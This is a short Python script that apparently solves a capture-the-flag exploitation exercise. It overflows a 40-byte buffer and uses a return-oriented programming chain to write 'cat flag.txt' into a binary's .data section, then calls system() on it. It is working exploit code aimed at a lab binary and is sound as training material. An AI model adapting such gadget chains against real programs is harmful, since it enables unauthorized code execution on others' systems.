import struct

pop_r14_r15 = 0x0000000000400890        # pop r14 ; pop r15 ; ret
mov_r14_r15 = 0x0000000000400820        # mov QWORD PTR [r14],r15 ; ret
pop_rdi = 0x0000000000400893            # pop rdi ; ret
# the data section is writable and of size 0x10 which is enough to hold our string
# it doesn't contain anything that should not be overwritten in this case
data_section = 0x0000000000601050
cat_flag = "\x63\x61\x74\x20\x66\x6c\x61\x67"   # cat flag
txt = "\x2e\x74\x78\x74\x00\x00\x00\x00"        # .txt (null bytes are allowed in this case since fgets is being used to read input)

call_system = 0x0000000000400810

p = "A"*40

p += struct.pack("<Q", pop_r14_r15)
p += struct.pack("<Q", data_section)    # r14 contains the addr
p += cat_flag                           # r15 contains the bytes to be written
p += struct.pack("<Q", mov_r14_r15)     # write the data to memory

p += struct.pack("<Q", pop_r14_r15)
p += struct.pack("<Q", data_section+8)
p += txt
p += struct.pack("<Q", mov_r14_r15)

p += struct.pack("<Q", pop_rdi)         # populate rdi by arg
p += struct.pack("<Q", data_section)
p += struct.pack("<Q", call_system)

print(p)
